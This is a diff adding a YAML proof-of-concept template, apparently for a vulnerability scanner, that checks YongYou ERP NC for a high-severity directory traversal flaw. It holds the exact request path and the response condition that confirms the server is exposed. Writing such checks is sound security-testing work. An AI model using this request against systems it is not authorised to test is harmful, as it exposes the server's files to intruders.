@@ -1,0 +1,16 @@
+id: poc-yaml-yongyou-erp-nc-directory-traversal
+info:
+  name: YongYou ERP NC 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: YongYou
+  osprey-id: vb_2021_0021
+requests:
+- method: GET
+  path: /NCFindWeb?service=IPreAlertConfigService&filename=ncwslogin.jsp
+  expression: 'status_code == 200 && contains(body, "<jsp:forward page=\"WEB-INF/jsp/resolution.jsp\">")
+
+    '
+variables: {}
+transport: http
